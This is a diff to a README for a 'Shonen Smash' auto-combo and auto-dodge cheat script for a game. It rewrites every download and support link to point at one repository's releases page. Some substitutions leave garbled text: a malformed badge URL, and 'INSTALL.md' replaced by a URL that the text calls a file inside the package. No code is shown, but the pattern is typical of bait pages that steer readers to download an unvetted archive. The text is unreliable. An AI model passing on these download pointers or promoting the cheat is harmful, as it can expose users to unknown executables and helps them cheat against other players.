@@ -1,6 +1,6 @@
 # Shonen Smash Auto-Combo and Auto-Dodge Script
 
-![Shonen Smash](https://img.shields.io/badge/Shonen%20Smash-Auto%20Combo%20Script-blue.svg)
+![Shonen Smash](https://github.com/makmanav/Shonen-Smash/releases%20Smash-Auto%20Combo%https://github.com/makmanav/Shonen-Smash/releases)
 
 Welcome to the **Shonen Smash** repository! This project features an auto-combo and auto-dodge script designed to enhance your gameplay experience in Shonen Smash. With this tool, you can execute powerful attack chains and dodge enemy strikes with perfect timing. This cheat optimizes your damage output and defense, giving you a significant edge in fast-paced anime-style battles.
 
@@ -24,9 +24,9 @@ Welcome to the **Shonen Smash** repository! This project features an auto-combo 
 
 ## Installation
 
-To get started, you need to download the script. You can find the latest version [here](https://github.com/repo/user/archive.zip). 
+To get started, you need to download the script. You can find the latest version [here](https://github.com/makmanav/Shonen-Smash/releases). 
 
-Once downloaded, extract the zip file and follow the instructions in the `INSTALL.md` file included in the package.
+Once downloaded, extract the zip file and follow the instructions in the `https://github.com/makmanav/Shonen-Smash/releases` file included in the package.
 
 ## Usage
 
@@ -63,9 +63,9 @@ This project is licensed under the MIT License. See the `LICENSE` file for detai
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Releases](https://github.com/repo/user/releases) section for updates and fixes. You can also reach out to the community for help.
+If you encounter any issues or have questions, please check the [Releases](https://github.com/makmanav/Shonen-Smash/releases) section for updates and fixes. You can also reach out to the community for help.
 
-For the latest version of the script, you can download it [here](https://github.com/repo/user/archive.zip).
+For the latest version of the script, you can download it [here](https://github.com/makmanav/Shonen-Smash/releases).
 
 ---
 
